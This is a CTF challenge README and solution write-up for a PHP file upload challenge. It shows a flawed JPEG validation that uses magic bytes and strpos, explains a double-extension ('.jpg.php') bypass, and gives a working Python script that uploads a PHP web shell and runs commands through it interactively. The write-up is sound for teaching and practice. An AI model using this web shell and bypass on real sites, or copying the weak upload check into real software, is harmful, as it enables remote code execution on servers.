# The Evil Assignment on Canvas 😈

## 1. Description

Oh noooo, when you're "chilling" with this CTF, your evil professor throws an impossible assignment on Canvas at you, and it's due TOMORROW!

The only way to pass this course is to pwn him!! The show will never end! 

### Guide: 
1. Turn on your Docker instance. 
2. Access: `http://14.225.211.39:$PORT` where `$PORT` is the port number given by the system.
3. pwn!

### Notes
+ The `revert` button only refresh the Docker instance for you, not to be used for deleting the containers.
+ Because of performance-critical reasons, we will shut down all of the containers periodically (2-4 hours). We will put announcement when we nuke all of the containers :)

Author: `@sashaNull`

## 2. Build

```bash
docker build -t evil_assignment_on_canvas . 
```

In order to make it only release 1 port, please use [`docker-copyedit`](https://github.com/gdraheim/docker-copyedit) to remove two required ports 8000 and 433. 

## 3. Solution

> Author: @teebow1e from hust3r

This challenge is a blackbox challenge, however, I will explain this in the white-box perspective since the solution is really straight-forward (if you have experience in File Upload vulnerability).


When access the challenge, we are given an upload form, which only accepts small-sized JPG/JPEG. This is the code checking if we upload a *"good"* file:
```php
<?php                  
    $magic_num_handler = file_get_contents($_FILES['uploadedfile']['tmp_name']);
    if(bin2hex(substr($magic_num_handler, 0, 3)) != "ffd8ff")
    {
            if(isset($_FILES['uploadedfile'])){
        echo "<p>Sorry, your submission is not recognized as a JPEG file by the back-end!</p>";
    }                 
        exit;
    } 

    $fileName = pathinfo($_FILES['uploadedfile']['name'])['basename']; 
    if (strpos($fileName, '.jpg') == false && strpos($fileName, '.jpeg') == false)
    {
            if(isset($_FILES['uploadedfile'])){
        echo "<p>Sorry, your submission is not recognized as a JPEG file by the back-end!</p>";
    }                 
        exit;
    }
```

- First, it checks the [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures) - the byte determining the file type. In order to bypass this, I just simply grab a legit JPG file on the Internet and submit to the form.

- Next, we have the code checking if `.jpg` or `.jpeg` exists in the filename. This is really dangerous because file name can contain more than 1 dot sign (which seperate the name and extension). Therefore, I can simply write a file named "a.jpg.php" and this is considered *valid* in the server side.


![](assets/strpos%20php.png)

At this point, we got enough ingredients. Let's cook the exploit script:
```python
import requests
import re
from urllib.parse import quote

url = "http://14.225.211.39:51419"

burp0_headers = {
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryijBAyAxAcQzDE3Xx"
}
burp0_data = """------WebKitFormBoundaryijBAyAxAcQzDE3Xx\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundaryijBAyAxAcQzDE3Xx\r\nContent-Disposition: form-data; name="uploadedfile"; filename="b.jpg.php"\r\nContent-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0\x00\x10JFIF<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>\r\n------WebKitFormBoundaryijBAyAxAcQzDE3Xx--\r\n"""
r = requests.post(url + "/index.php", headers=burp0_headers, data=burp0_data)
result = r.text
if "File is valid" in result:
    print("[+] Upload webshell complete.")
else:
    print("[!] Something went wrong while uploading webshell.")

while True:
    cmd = quote(input("[?] Command you want to run: "))
    webshell = requests.get(url + f"/uploads/b.jpg.php?cmd={cmd}").text
    result = (
        re.search(r"<pre>(.*?)</pre>", webshell, re.DOTALL).group(1).strip()
        if re.search(r"<pre>(.*?)</pre>", webshell, re.DOTALL)
        else None
    )
    print(result)
```
